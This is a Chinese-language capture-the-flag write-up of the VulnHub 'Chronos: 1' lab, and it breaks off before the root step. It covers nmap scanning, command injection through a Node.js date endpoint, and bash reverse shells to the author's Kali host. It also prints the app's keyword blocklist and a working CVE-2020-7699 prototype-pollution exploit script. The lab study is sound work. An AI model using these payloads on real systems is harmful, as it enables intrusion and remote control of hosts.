            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>这不刚写完 nodejs 的相关利用，这里也是马上找到了一个 js 的靶机来学习一下，本次的的目标<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2hyb25vcy0xLDczNS8=\"> Chronos: 1 ~ VulnHub</span>，本来想水一下描述，但是发现作者就给了一个中等难度，那我就自己做下来的过程给一个描述。</p>\n<h2 id=\"描述\"><a class=\"anchor\" href=\"#描述\">#</a> 描述</h2>\n<p>难度：中级</p>\n<p>设计的任务：</p>\n<ul>\n<li>主机发现，端口扫描</li>\n<li>WEB 应用攻击</li>\n<li>命令注入</li>\n<li>数据编解码</li>\n<li>框架漏洞利用</li>\n<li>代码审计</li>\n<li>本地提权</li>\n</ul>\n<p>虚拟机：</p>\n<ul>\n<li>格式： 虚拟机 （Virtualbox OVA）</li>\n<li>操作系统： Linux.</li>\n</ul>\n<p>联网：</p>\n<ul>\n<li>DHCP 服务：已启用</li>\n<li>IP 地址自动分配</li>\n</ul>\n<h2 id=\"攻击过程\"><a class=\"anchor\" href=\"#攻击过程\">#</a> 攻击过程</h2>\n<h3 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<p>这里靶机和我的 kali 都是通过桥接连接到局域网中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715073929840.png\" alt=\"image-20230715073929840\" /></p>\n<p>这里我 kali 的 ip 是 192.168.13.249, 这里用 nmap 扫描 13 全段</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715074108860.png\" alt=\"image-20230715074108860\" /></p>\n<p>这里给其分配的 ip 是 192.168.13.96, 接着对端口进行一个协议的发现</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715074315887.png\" alt=\"image-20230715074315887\" /></p>\n<p>这里可以看到 22 端口是一个 openssh 服务，版本是 7.6，80 是一个 Apache 的 web 服务版本是 2.4.29，8000 端口是一个 nodejs 的 web 服务</p>\n<p>这里还是去通过浏览器访问 80 端口和 8000 端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715075134888.png\" alt=\"image-20230715075134888\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715075157760.png\" alt=\"image-20230715075157760\" /></p>\n<p>这里两个端口都发现了类似的 js 源码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715075334703.png\" alt=\"image-20230715075334703\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715075346630.png\" alt=\"image-20230715075346630\" /></p>\n<p>这里将这部分 js 代码复制到文本中分析，这里文本信息很杂乱，而且有编码，这里使用在线工具对其进行整理</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715080007487.png\" alt=\"image-20230715080007487\" /></p>\n<pre><code class=\"language-JavaScript\">var _0x5bdf = [\n\t'150447srWefj',\n\t'70lwLrol',\n\t'1658165LmcNig',\n\t'open',\n\t'1260881JUqdKM',\n\t'10737CrnEEe',\n\t'2SjTdWC',\n\t'readyState',\n\t'responseText',\n\t'1278676qXleJg',\n\t'797116soVTES',\n\t'onreadystatechange',\n\t'http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL',\n\t'User-Agent',\n\t'status',\n\t'1DYOODT',\n\t'400909Mbbcfr',\n\t'Chronos',\n\t'2QRBPWS',\n\t'getElementById',\n\t'innerHTML',\n\t'date'\n];\n(function (_0x506b95, _0x817e36) &#123;\n\tvar _0x244260 = _0x432d;\n\twhile (!![]) &#123;\n\t\ttry &#123;\n\t\t\tvar _0x35824b = -parseInt(_0x244260(126)) * parseInt(_0x244260(144)) + parseInt(_0x244260(142)) + parseInt(_0x244260(127)) * parseInt(_0x244260(131)) + -parseInt(_0x244260(135)) + -parseInt(_0x244260(130)) * parseInt(_0x244260(141)) + -parseInt(_0x244260(136)) + parseInt(_0x244260(128)) * parseInt(_0x244260(132));\n\t\t\tif (_0x35824b === _0x817e36)\n\t\t\t\tbreak;\n\t\t\telse\n\t\t\t\t_0x506b95['push'](_0x506b95['shift']());\n\t\t&#125; catch (_0x3fb1dc) &#123;\n\t\t\t_0x506b95['push'](_0x506b95['shift']());\n\t\t&#125;\n\t&#125;\n&#125;(_0x5bdf, 831262));\nfunction _0x432d(_0x16bd66, _0x33ffa9) &#123;\n\treturn _0x432d = function (_0x5bdf82, _0x432dc8) &#123;\n\t\t_0x5bdf82 = _0x5bdf82 - 126;\n\t\tvar _0x4da6e8 = _0x5bdf[_0x5bdf82];\n\t\treturn _0x4da6e8;\n\t&#125;, _0x432d(_0x16bd66, _0x33ffa9);\n&#125;\nfunction loadDoc() &#123;\n\tvar _0x17df92 = _0x432d, _0x1cff55 = _0x17df92(143), _0x2beb35 = new XMLHttpRequest();\n\t_0x2beb35[_0x17df92(137)] = function () &#123;\n\t\tvar _0x146f5d = _0x17df92;\n\t\tthis[_0x146f5d(133)] == 4 &amp;&amp; this[_0x146f5d(140)] == 200 &amp;&amp; (document[_0x146f5d(145)](_0x146f5d(147))[_0x146f5d(146)] = this[_0x146f5d(134)]);\n\t&#125;, _0x2beb35[_0x17df92(129)]('GET', _0x17df92(138), !![]), _0x2beb35['setRequestHeader'](_0x17df92(139), _0x1cff55), _0x2beb35['send']();\n&#125;\n</code></pre>\n<p>这里有个 url，先对参数进行解码，发现是 base58 加密</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715082739759.png\" alt=\"image-20230715082739759\" /></p>\n<p>现在不知道有什么用，这里去访问一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715080204315.png\" alt=\"image-20230715080204315\" /></p>\n<p>这里直接去访问是没有权限的，这里我开始以为是伪造身份信息之类，最后我又访问了一次不带参数的 8000 端口发现了奇怪的地方</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081112507.png\" alt=\"image-20230715081112507\" /></p>\n<p>这里直接发送了 http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL 这个请求，但是他的页面又是基于 ip 的，这个域名没法解析，于是这里我更改了本地的 host 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081512401.png\" alt=\"image-20230715081512401\" /></p>\n<p>更改完成的效果</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081553334.png\" alt=\"image-20230715081553334\" /></p>\n<p>这是我再去访问页面</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081819105.png\" alt=\"image-20230715081819105\" /></p>\n<p>这里再去尝试访问 http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL 这个请求就是能成功的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081712016.png\" alt=\"image-20230715081712016\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081722800.png\" alt=\"image-20230715081722800\" /></p>\n<p>两个页面都多来一条当前的时间</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715082339580.png\" alt=\"image-20230715082339580\" /></p>\n<p>这里可以看见，这个时间实际上是 get 的这个请求得到的，这里使用 burp 抓包方便测试，这个输出的结果格式和上面解码拿到的相同，这里更改了一下传入的信息</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715083121633.png\" alt=\"image-20230715083121633\" /></p>\n<p>这里通过 burp 重放</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715083148006.png\" alt=\"image-20230715083148006\" /></p>\n<p>可以看到这里是能根据我的参数进行改变的</p>\n<h3 id=\"命令注入反弹shell\"><a class=\"anchor\" href=\"#命令注入反弹shell\">#</a> 命令注入反弹 shell</h3>\n<p>很显然这里应该是一个 date 命令，这里应该是可以进行命令注入</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715085117363.png\" alt=\"image-20230715085117363\" /></p>\n<p>这里这样尝试一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715085140947.png\" alt=\"image-20230715085140947\" /></p>\n<p>发现是能够成功执行命令的，这里反弹一个 shell</p>\n<pre><code class=\"language-perl\">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.13.249/2333 0&gt;&amp;1&quot;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715085421912.png\" alt=\"image-20230715085421912\" /></p>\n<p>这里就可以成功拿到一个 shell</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715085501970.png\" alt=\"image-20230715085501970\" /></p>\n<h3 id=\"进一步信息收集\"><a class=\"anchor\" href=\"#进一步信息收集\">#</a> 进一步信息收集</h3>\n<p>接下来就是去这台机器上面寻找相关信息，首先我到根目录就看到一个 lost+found 文件，这里应该是一个删除的文件，这里想要打开却权限不够</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715090922436.png\" alt=\"image-20230715090922436\" /></p>\n<p>所以这里我又去查看了一下 /etc/passwd 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715091218132.png\" alt=\"image-20230715091218132\" /></p>\n<p>这里看见有两个可以执行 shell 的用户，这里去 home 目录看一下发现有一个 imera 目录，但是没权限打开其中的文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715091623349.png\" alt=\"image-20230715091623349\" /></p>\n<p>这里就需要提权，当时内核，sudo，suid 都没有找到能提权的方式，这里最后是在网站根目录找到了能进一步利用的地方，这里可以先看到 package,json 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715093606041.png\" alt=\"image-20230715093606041\" /></p>\n<p>这里声明了环境用到的框架和库，这里可以看到使用了 express 框架，这里看一下 app.js</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'express'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token punctuation\">&#123;</span> exec <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child_process\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> bs58 <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'bs58'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">const</span> app <span class=\"token operator\">=</span> <span class=\"token function\">express</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">const</span> port <span class=\"token operator\">=</span> <span class=\"token number\">8000</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">const</span> cors <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cors'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token function\">cors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span>res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">sendFile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/var/www/html/index.html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/date'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">var</span> agent <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'user-agent'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">var</span> cmd <span class=\"token operator\">=</span> <span class=\"token string\">'date '</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">const</span> format <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>format<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">const</span> bytes <span class=\"token operator\">=</span> bs58<span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>format<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">var</span> decoded <span class=\"token operator\">=</span> bytes<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">var</span> concat <span class=\"token operator\">=</span> cmd<span class=\"token punctuation\">.</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span>decoded<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>agent <span class=\"token operator\">===</span> <span class=\"token string\">'Chronos'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>concat<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> concat<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'whoami'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> concat<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'python'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> concat<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'nc'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> concat<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'bash'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> concat<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'php'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> concat<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'which'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> concat<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'socat'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Something went wrong\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>concat<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">error<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">error: </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>error<span class=\"token punctuation\">.</span>message<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>stderr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">stderr: </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>stderr<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Permission Denied\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Server running at </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>port<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这个就是刚刚访问的那个服务的代码，回到上级目录，这里发现了另一个目录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715102046937.png\" alt=\"image-20230715102046937\" /></p>\n<p>这里看到 chronos-v2 是隶属 root 的，这里就猜测这里可能是有另一个 web 应用这里，这里也是进去看一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715102811833.png\" alt=\"image-20230715102811833\" /></p>\n<p>这里又发现一个 package.json 文件，这里打开看一下这个文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715102923282.png\" alt=\"image-20230715102923282\" /></p>\n<p>这里有一个 express-fileupload，这里存在原型链污染，这里先提一下，详细的后面说，接着打开 server.js 文件</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'express'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> fileupload <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"express-fileupload\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> http <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'http'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">const</span> app <span class=\"token operator\">=</span> <span class=\"token function\">express</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token function\">fileupload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">parseNested</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'view engine'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ejs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'views'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/opt/chronos-v2/frontend/pages\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   res<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">const</span> server <span class=\"token operator\">=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">Server</span><span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">const</span> addr <span class=\"token operator\">=</span> <span class=\"token string\">\"127.0.0.1\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">const</span> port <span class=\"token operator\">=</span> <span class=\"token number\">8080</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>server<span class=\"token punctuation\">.</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Server listening on '</span> <span class=\"token operator\">+</span> addr <span class=\"token operator\">+</span> <span class=\"token string\">' port '</span> <span class=\"token operator\">+</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里可以看到，这个 8080 只开放给 127.0.0.1，这里可以看到 parseNested 配置选项设置为 true，前面的版本是 1.1.7，条件都满足了 NodeJS 模块代码注入</p>\n<h3 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h3>\n<p>漏洞编号 CVE-2020-7699</p>\n<pre><code class=\"language-python\">import requests\n\nurl = 'http://127.0.0.1:8080'\ncmd = 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.13.249/2444 0&gt;&amp;1&quot;'\npoc = &#123;\n    '__proto__.outputFunctionName': (None,f&quot;x;process.mainModule.require('child_process').exec('&#123;cmd&#125;');x&quot;\n    )\n&#125;\n\nrequests.post(url, files=poc)\nrequests.get(url)\n</code></pre>\n<p>这里在 kali 开启 http 服务将文件传输进靶机中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715115021639.png\" alt=\"image-20230715115021639\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715115034887.png\" alt=\"image-20230715115034887\" /></p>\n<p>这里监听 2444 端口后运行脚本</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715115653458.png\" alt=\"image-20230715115653458\" /></p>\n<p>成功拿到 shell，这里可以看到当前的用户是 imera，是不是就想起了开始为什么要提权？当即去到 imera 目录查看那个 user.txt 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715115924920.png\" alt=\"image-20230715115924920\" /></p>\n<p>这里拿到的好像又是一个编码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715120043402.png\" alt=\"image-20230715120043402\" /></p>\n<p>这里算是拿到了第一个 flag，但是这并没结束，我们并没有拿到 root 